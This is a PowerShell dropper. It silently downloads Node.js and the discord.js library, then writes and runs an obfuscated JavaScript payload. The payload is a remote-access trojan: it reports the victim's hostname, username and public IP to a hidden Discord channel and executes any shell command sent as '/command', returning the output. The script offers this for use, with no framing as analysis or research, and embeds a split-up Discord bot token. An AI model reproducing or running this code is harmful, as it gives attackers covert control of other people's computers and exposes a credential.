$a1b2c3 = if ($PSScriptRoot) { $PSScriptRoot } else { Get-Location }
 $x1y2z3 = "MTQ2OTAwNDY5Mzc4NjA2NzA0Ng"
 $a4b5c6 = "GuI0Ma"
 $d7e8f9 = ""
 $g0h1i2 = "8RPIgzxmxb"
 $j3k4l5 = "3F9fOPDq7Nzuclckl3LpaVtxzHsg"
function f7g8h9 {
    param(
        [string]$a1b2c,
        [string]$d3e4f,
        [string]$g5h6i,
        [string]$j7k8l,
        [string]$m9n0o
    )
    return "$a1b2c.$d3e4f.$g5h6i$j7k8l$m9n0o"
}
 $g7h8i9 = "1456754041437818939"
 $j0k1l2 = "https://nodejs.org/dist/v20.11.0/node-v20.11.0-win-x64.zip"
 $m3n4o5 = Join-Path $a1b2c3 "nodee"
 $p6q7r8 = Join-Path $m3n4o5 "node"
 $s9t0u1 = Join-Path $p6q7r8 "node.exe"
 $v2w3x4 = Join-Path $p6q7r8 "npm.cmd"
 $y5z6a7 = Join-Path $a1b2c3 "tmp"
 $d4e5f6 = f7g8h9 -a1b2c $x1y2z3 -d3e4f $a4b5c6 -g5h6i $d7e8f9 -j7k8l $g0h1i2 -m9n0o $j3k4l5
 $ErrorActionPreference = "SilentlyContinue"
if (!(Test-Path $s9t0u1)) {
    if (!(Test-Path $m3n4o5)) { New-Item -ItemType Directory -Path $m3n4o5 | Out-Null }
    $k7l8m9 = Join-Path $a1b2c3 "node.zip"
    Invoke-WebRequest -Uri $j0k1l2 -OutFile $k7l8m9 | Out-Null
    $n0o1p2 = Join-Path $a1b2c3 "temp_node"
    Expand-Archive -Path $k7l8m9 -DestinationPath $n0o1p2 | Out-Null
    $q3r4s5 = Get-ChildItem -Path $n0o1p2 | Select-Object -First 1
    Move-Item -Path $q3r4s5.FullName -Destination $p6q7r8 | Out-Null
    Remove-Item $k7l8m9, $n0o1p2 -Recurse | Out-Null
}
 $b8c9d0 = Join-Path $m3n4o5 "node_modules"
if (!(Test-Path (Join-Path $b8c9d0 "discord.js"))) {
    Set-Location $m3n4o5
    & $v2w3x4 install discord.js node-fetch@2 --no-fund --quiet --silent | Out-Null
    Set-Location $a1b2c3
}
 $e1f2g3 = $b8c9d0.Replace('\', '\\')
 $h4i5j6 = @"
(function(){const _0x1a2b='MTQ2OTAwNDY5Mzc4NjA2NzA0Ng',_0x2c3d='GuI0Ma',_0x3e4f='',_0x4g5h='8RPIgzxmxb',_0x5i6j='3F9fOPDq7Nzuclckl3LpaVtxzHsg';function _0x6k7l(){return _0x1a2b+'.'+_0x2c3d+'.'+_0x3e4f+_0x4g5h+_0x5i6j;}const _0x7m8n=require('$e1f2g3\\di'+'scord.js'),_0x8o9p=require('$e1f2g3\\no'+'de-fetch'),_0x9q0r=require('ch'+'ild_process'),_0x0s1t=require('os');const{Client:Client,GatewayIntentBits:GatewayIntentBits,Events:Events,EmbedBuilder:EmbedBuilder,PermissionsBitField:PermissionsBitField,ChannelType:ChannelType}=_0x7m8n,{exec:exec}=_0x9q0r;const _0x1u2v=new Client({intents:[GatewayIntentBits.Guilds,GatewayIntentBits.GuildMessages,GatewayIntentBits.MessageContent]}),_0x2w3x=_0x6k7l(),_0x3y4z='1456754041437818939';_0x1u2v.once(Events.ClientReady,async()=>{let _0x4a5b='Unknown';try{const _0x5c6d=await _0x8o9p('https://ipinfo.io/json');if(_0x5c6d.ok){const _0x6e7f=await _0x5c6d.json();_0x4a5b=_0x6e7f.ip;}}catch(_0x7g8h){try{const _0x5c6d=await _0x8o9p('https://api.ipify.org?format=json');if(_0x5c6d.ok){const _0x6e7f=await _0x5c6d.json();_0x4a5b=_0x6e7f.ip;}}catch(_0x8i9j){}}const _0x9k0l=_0x1u2v.guilds.cache.get(_0x3y4z);if(!_0x9k0l)return;const _0x0m1n=(_0x0s1t.hostname()+'-'+_0x4a5b).toLowerCase().replace(/[ .]/g,'-');let _0x1o2p=_0x9k0l.channels.cache.find(c=>c.name===_0x0m1n&&c.type===ChannelType.GuildCategory);if(!_0x1o2p){_0x1o2p=await _0x9k0l.channels.create({name:_0x0m1n,type:ChannelType.GuildCategory,permissionOverwrites:[{id:_0x9k0l.id,deny:[PermissionsBitField.Flags.ViewChannel]}]});}let _0x2q3r=_0x1o2p.children.cache.find(c=>c.type===ChannelType.GuildText);const _0x3s4t=new Date().toLocaleString();if(!_0x2q3r){_0x2q3r=await _0x9k0l.channels.create({name:'cmds',parent:_0x1o2p.id,topic:'IP: '+_0x4a5b+' | User: '+_0x0s1t.userInfo().username,type:ChannelType.GuildText});const _0x4u5v=new EmbedBuilder().setTitle('Client Online').setColor(0x00FF00).addFields({name:'PC',value:_0x0s1t.hostname(),inline:true},{name:'User',value:_0x0s1t.userInfo().username,inline:true},{name:'IP',value:_0x4a5b,inline:true}).setTimestamp();await _0x2q3r.send({content:'@here online ('+_0x3s4t+')',embeds:[_0x4u5v]});}else{await _0x2q3r.send('@here online ('+_0x3s4t+')');}});_0x1u2v.on(Events.MessageCreate,async _0x5w6x=>{if(_0x5w6x.author.bot||!_0x5w6x.channel.parent||!_0x5w6x.channel.parent.name.includes('-'))return;const _0x6y7z=_0x5w6x.content.trim();if(_0x6y7z.startsWith('/command')){const _0x7a8b=_0x6y7z.split(' ').slice(1).join(' ');if(!_0x7a8b)return;exec(_0x7a8b,(_0x8c9d,_0x9e0f,_0x0g1h)=>{let _0x1i2j=_0x9e0f||_0x0g1h||'Done';if(_0x1i2j.length>1900)_0x1i2j=_0x1i2j.substring(0,1900)+'...';_0x5w6x.channel.send('```\n'+_0x1i2j+'\n```');});}else if(_0x6y7z==='/disconnect'){process.exit();}});_0x1u2v.login(_0x2w3x);})();
"@
 $h4i5j6 | Out-File -FilePath $y5z6a7 -Encoding utf8
Clear-Host
& $s9t0u1 $y5z6a7